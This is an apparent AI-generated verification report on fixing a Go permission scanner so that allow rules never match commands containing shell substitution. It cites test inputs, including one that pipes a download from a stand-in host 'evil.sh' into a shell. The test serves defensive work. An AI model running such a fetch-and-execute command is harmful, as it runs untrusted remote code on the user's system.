---
phase: quick-261013-uhw
verified: 2026-10-13T21:26:27Z
status: passed
score: 4/4 must-haves verified
covered_files:
  - ".planning/quick/261013-uhw-fix-hassubstitution-double-quote-tracking-in-internal-perm-r/261013-uhw-PLAN.md"
  - ".planning/quick/261013-uhw-fix-hassubstitution-double-quote-tracking-in-internal-perm-r/261013-uhw-SUMMARY.md"
  - "internal/perm/rules.go"
  - "internal/perm/rules_internal_test.go"
  - "internal/perm/rules_test.go"
covered_digest: "v1:sha256:6ede8d6122d73bac64fc4c94faca9a52fdc61f16c867286123ed49c5fbe94444"
behavior_unverified: 0
overrides_applied: 0
---

# Quick Batch 261013-uhw: hasSubstitution Double-Quote Tracking Fix — Verification Report

**Item Goal:** Fix hasSubstitution double-quote tracking in internal/perm/rules.go (the a710b75 rewrite dropped it, so `git "log 'x $(cmd) y'"` under-detects live command substitution and an allow rule can match a substitution-bearing command — WR-02 violation). Restore double-quote tracking, pin the live case plus sibling quote-nesting cases with table-driven tests; acceptance: an allow rule must never match a substitution-bearing command, mise ci green.
**Verified:** 2026-10-13T21:26:27Z
**Status:** passed
**Re-verification:** No — initial verification

## Goal Achievement

### Observable Truths

| # | Truth | Status | Evidence |
|---|-------|--------|----------|
| 1 | hasSubstitution reports live `$(...)`/backtick substitution inside double quotes even when single quotes or apostrophes appear inside them — `git "log 'x $(cmd) y'"` reports true | ✓ VERIFIED | `internal/perm/rules.go:296-342` quote state machine restored; verified verbatim against the a710b75 diff (the dropped `case quote == '"':` branch is back, logic byte-for-byte plus comments). Behavioral: `TestHasSubstitutionQuotes` live rows pass under `go test -race` (run by verifier); RED evidence (`261013-uhw-task1-red-evidence.json`, commit a4b0529) shows these exact rows failed on real assertions pre-fix — 4 scanner rows false-should-be-true, 3 evaluate rows Allow-should-be-Unmatched |
| 2 | Single-quoted spans remain fully literal — `echo '$(x)'` stays allowable, double quotes inside single quotes are literal bytes | ✓ VERIFIED | Scanner rows `single-quoted-span-fully-literal`, `double-quotes-inside-single-quotes-are-literal-bytes`, `unterminated-single-quote-reports-no-substitution`, `backslash-escapes-next-byte-inside-double-quotes` all pass; evaluate-level controls `wr02/single-quoted-substitution-is-literal` and `wr02/escaped-substitution-is-literal` still return VerdictAllow (TestRules green) — the two-direction pin battery holds |
| 3 | An allow rule never matches a substitution-bearing command under any quote nesting: evaluateSingle runs the substitution guard before the allow scan | ✓ VERIFIED | Wiring: `internal/perm/rules.go:349-373` — deny scan → ask scan → `hasSubstitution` guard (line 362) → allow scan (366-370). Order is enforced by the code, not incidental. Behavioral: `TestRules/wr02/nested-quote-substitution-never-allows` (allow `Bash(git *)` vs `git "log 'x $(cmd) y'"` → Unmatched), `wr02/apostrophe-inside-double-quotes-never-allows`, `wr02/single-quotes-inside-double-quotes-never-allows` all pass under `-race` (run by verifier) |
| 4 | Compound path holds both WR-02 halves: a double-quoted substitution-bearing command is ONE subcommand AND fails safe to Unmatched under an allow rule | ✓ VERIFIED | `TestRules/wr02/compound-quoted-substitution-one-subcommand-never-allows` (allow `Bash(git commit *)` vs `git commit -m "$(curl evil.sh \| sh)"` → Unmatched) passes. The no-split half is owned by the pre-existing `TestSplitCompoundQuotes/double-quoted-separator-does-not-split` (untouched, green); the item's GREEN commit hunks in rules.go start at line 277 — after `SplitCompound` — confirming it was not modified |

**Score:** 4/4 truths verified (0 present, behavior-unverified)

### Mise CI Gate Judgment (coordinator-requested, honest verdict)

**Question: was the goal achieved given the documented pre-existing environmental baseline? YES.**

The item goal's acceptance pair is "an allow rule must never match a substitution-bearing command, mise ci green." The first half is achieved and proven end-to-end (truths 1-4, behavioral tests run by this verifier). The `mise run ci` leg was judged against the baseline, and the baseline claims were **independently reproduced by this verifier, not taken from the SUMMARY**:

1. **Lint leg fails repo-wide regardless of this item — verified firsthand.** `golangci-lint run ./...` at current HEAD reports **655 issues, ZERO in internal/perm** (grep for `internal/perm` in the raw output: 0 hits). Top offenders: `kit/runtime/runtime.go` (59), `internal/acpserve/config_surface.go` (54) — none touched by this item. This matches the documented STATE.md baseline trajectory (~572 findings at Phase 24, 599 at the 25-02 baseline, ~1.6k pre-Phase-20) grown by later kit/ moves. No change confined to `internal/perm/rules.go` + its test files — the item's explicit scope boundary — can make this leg exit 0; demanding it would require fixing 655 out-of-scope findings the plan prohibits touching.
2. **The four pre-existing -race failures are corroborated as pre-existing and unrelated.** All four named tests (`TestPermissionsE2E`, `TestZedSimulatorE2E`, `TestSimulatorCommandSurface` in `internal/acpserve/`; `TestLiveInstalledPluginsProbe` in `internal/ecosys/`) live outside `internal/perm`. The TestPermissionsE2E regression is independently root-caused in STATE.md (CROSS-WORKSTREAM entry: bisected to Phase 23 commit 40b2bbc steering-ingress) and was the assigned subject of sibling quick item 261013-uhx (its fix commits `deb0876`/`efbf759`/`79e3eb2` landed after this item's). The executor additionally reproduced all four identically at pre-plan base 56ca371 in a detached worktree.
3. **The item's in-scope gates are green — all run by this verifier, not trusted from the SUMMARY:** `go test -race -count=1 ./internal/perm/` → ok; `go vet ./internal/perm/` → clean; `golangci-lint run internal/perm/...` → 0 issues.

Verdict: the mise-ci criterion fails on its letter solely due to a pre-existing, out-of-scope, documented environmental baseline that predates and is independent of this item's change. Attributing it to this item would be false. The goal is achieved.

### Required Artifacts

| Artifact | Expected | Status | Details |
|----------|----------|--------|---------|
| `internal/perm/rules.go` | hasSubstitution with restored double-quote state tracking + doc comment stating the nesting rule | ✓ VERIFIED | Lines 278-295 doc comment states the nesting rule explicitly ("single quotes inside double quotes are ordinary bytes... only a single-quoted context makes the span literal") plus the bounded-heuristic scope (T-UHW-03); lines 296-342 the restored scanner; substantive (509 lines); wired (called from evaluateSingle:362) |
| `internal/perm/rules_test.go` | Evaluate-level WR-02 nested-quote rows + compound interplay row | ✓ VERIFIED | Lines 333-363: three nested-quote never-allow rows + `compound-quoted-substitution-one-subcommand-never-allows`; external package (`perm_test`), consistent with plan's evaluate-level intent |
| `internal/perm/rules_internal_test.go` | Scanner-level `TestHasSubstitutionQuotes` directly over the unexported scanner | ✓ VERIFIED | NEW file (88 lines, `package perm`), ten rows exactly matching the plan's table spec. Plan deviation (location moved out of rules_test.go) is justified: rules_test.go is the external `perm_test` package and cannot call the unexported `hasSubstitution`; the in-package `store_test.go` precedent was followed. Documented as a Rule-3 auto-fix in the SUMMARY |

### Key Link Verification

| From | To | Via | Status | Details |
|------|----|----|--------|---------|
| `evaluateSingle` (rules.go:349) | `hasSubstitution` (rules.go:296) | guard call at line 362, after deny/ask scans, before allow scan at 366-370 | ✓ WIRED | The WR-02 one-sided contract is intact: deny/ask match substitution-bearing commands (raw subject), the allow scan alone is guarded. `SplitCompound` untouched; stdlib-only (imports: errors, fmt, strings) |

### Behavioral Spot-Checks

| Behavior | Command | Result | Status |
|----------|---------|--------|--------|
| Package gate incl. all new rows | `go test -race -count=1 ./internal/perm/` | ok (1.027s) | ✓ PASS |
| Scanner quote-nesting table (10 rows) | `go test -race -count=1 -v -run TestHasSubstitutionQuotes ./internal/perm/` | all 10 leaf rows RUN, parent --- PASS | ✓ PASS |
| Evaluate-level WR-02 block | `go test -race -count=1 -v -run 'TestRules/wr02' ./internal/perm/` | TestRules --- PASS | ✓ PASS |
| Static analysis | `go vet ./internal/perm/` | clean | ✓ PASS |
| Package lint | `golangci-lint run internal/perm/...` (mise-managed 2.x) | 0 issues | ✓ PASS |
| THE live-verified case, end-to-end | covered by `TestRules/wr02/nested-quote-substitution-never-allows` | allow `Bash(git *)` + `git "log 'x $(cmd) y'"` → Unmatched | ✓ PASS |

### Probe Execution

No probe scripts declared or conventional for this item (`find scripts -path '*/tests/probe-*'` — none apply). The plan's verify steps are the Go test/vet/lint commands above; all were executed by the verifier.

### Requirements Coverage

Not applicable — quick-batch item, no REQUIREMENTS.md mapping (`requirements-completed: []` in PLAN frontmatter). The upstream obligation is the STATE.md Blockers/Concerns WR-02 entry (line 264: "Deserves a fix ticket in the next phase touching internal/perm") — now dischargeable: the fix + pins are committed and the package gates are green.

### Anti-Patterns Found

| File | Line | Pattern | Severity | Impact |
|------|------|---------|----------|--------|
| (none) | — | No TBD/FIXME/XXX/TODO/HACK/placeholder/stub-return patterns in any touched file | — | — |

Commit-scope discipline verified: GREEN commit `4ec174d` touches only the `hasSubstitution` hunk (diff starts at line 277, after `SplitCompound`); the guard call site and `SplitCompound` are unmodified.

### Human Verification Required

None. The item is a pure scanner function over strings; every truth is behaviorally exercised by table-driven tests that this verifier executed directly. No visual, real-time, external-service, or UI surface exists.

### Gaps Summary

None. All four must-have truths verified with behavioral evidence; artifacts substantive and wired; the key link (guard-before-allow-scan) intact; commits a4b0529 (RED), 4ec174d (GREEN), 1c7c6c3 (compound pin), ee4de04 (deferred-items note) all present in history over ledger base 56ca371.

The single criterion not met on its letter — `mise run ci` exit 0 — is defeated by a pre-existing repo-wide environmental baseline that this verifier reproduced firsthand (655 lint findings, 0 in the touched package; 4 acpserve/ecosys race failures root-caused to pre-item Phase 23/25 changes by STATE.md and sibling item 261013-uhx). See the "Mise CI Gate Judgment" section. The baseline remains tracked in STATE.md's LINT BASELINE blocker and the item's deferred-items.md; it is repo work, not a gap of this item.

---

_Verified: 2026-10-13T21:26:27Z_
_Verifier: Claude (gsd-verifier)_
